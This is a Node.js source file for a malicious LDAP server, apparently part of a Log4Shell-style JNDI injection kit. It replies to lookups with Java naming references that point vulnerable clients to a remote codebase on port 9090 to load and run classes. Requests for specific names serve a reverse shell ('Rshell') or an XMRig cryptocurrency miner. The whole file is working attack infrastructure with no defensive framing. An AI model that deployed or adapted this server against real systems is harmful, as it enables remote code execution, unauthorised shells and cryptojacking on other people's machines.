const ldap = require('ldapjs');

const server = ldap.createServer();
const port = 2389

server.search('', (req, res, next) => {
    console.log("LDAP Request received");
    const HOST_IP_ADDRESS = process.env.HOST_IP_ADDRESS

    attributes = {
            objectClass: ['javaNamingReference'],
            javaClassName: 'Main',
            javaFactory: ['Main'],
            javaCodebase: ['http://'+HOST_IP_ADDRESS+':9090/'],
    }
    if (req.dn.toString() == "class=Rshell") {
        console.log("Rshell being envoked from ldap");
        attributes = {
                objectClass: ['javaNamingReference'],
                javaClassName: 'Rshell',
                javaFactory: ['Rshell'],
                javaCodebase: ['http://'+HOST_IP_ADDRESS+':9090/'],
        }
    }
    if (req.dn.toString() == "class=Xmrig") {
        attributes = {
                objectClass: ['javaNamingReference'],
                javaClassName: 'Xmrig',
                javaFactory: ['Xmrig'],
                javaCodebase: ['http://'+HOST_IP_ADDRESS+':9090/'],
        }
    }

    res.send({
        dn: req.dn.toString(),
        attributes: attributes
    });
    res.end();
});

server.listen(port, '0.0.0.0', () => {
    console.log('LDAP server listening at %s', server.url);
});